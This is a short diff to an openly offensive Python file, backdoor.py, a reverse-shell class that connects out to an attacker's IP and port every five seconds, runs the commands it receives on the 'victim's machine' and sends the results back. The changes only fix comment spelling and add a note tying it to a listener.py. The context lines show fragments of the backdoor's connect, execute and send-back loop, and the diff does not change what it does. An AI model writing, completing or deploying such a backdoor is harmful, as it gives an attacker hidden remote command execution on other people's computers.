@@ -1,7 +1,9 @@
 #!/usr/bin/python3
 import socket, subprocess, os, time
-#backdoor.py - class that execute commands on victum's machine and send results to hacker's machine
+#backdoor.py - class that execute on victim's machine commands aquired from hacker's machine and send
+#results to hacker's machine
 
+#used only in conjection with listener.py
 class Backdoor:
     def __init__(self, ip, port):
         while True: #trys to connect to particular ip and port every 5 seconds
@@ -38,5 +40,5 @@ class Backdoor:
                     self.connection.send(command_result) #send results to hacker's machine
                 except:
                     self.connection.send("[-] Wrong command".encode())
-        self.connection.close() #closing connection between hacker's and victum's machines
+        self.connection.close() #closing connection between hacker's and victim's machines
 
